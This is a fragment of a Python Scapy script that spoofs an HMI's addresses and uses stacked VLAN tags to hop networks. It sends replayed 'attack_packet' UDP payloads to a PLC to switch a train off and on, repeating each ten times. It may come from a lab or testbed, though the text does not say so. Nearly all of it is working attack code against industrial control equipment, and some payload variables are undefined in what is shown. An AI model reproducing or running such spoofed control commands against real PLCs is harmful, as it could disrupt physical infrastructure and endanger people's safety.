...
## outer tag: read first
## inner tag: read second
...
# 00:13:ef:30:07:d9
#
#attack_packet_try="1111"

def Send_TRAIN_OFF():
    data_off = bytes.fromhex(attack_packet_off)
    #data_off = bytes.fromhex(attack_packet_try)
    #udpf = Ether(src=PLC_MAC, dst=PLC_MAC) / IP(dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / Dot1Q(vlan=20) / Dot1Q(vlan=10) / Dot1Q(vlan=10) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    for _ in range(10):
        sendp(udpf)
...
def Send_TRAIN_ON():
    ...
    udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / Dot1Q(vlan=20) / Dot1Q(vlan=10) / Dot1Q(vlan=10) / Dot1Q(vlan=10) / Dot1Q(vlan=10) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_on)
    for _ in range(10):
        sendp(udpf)
    print("TRAIN ON\n")
    # time.sleep(1)
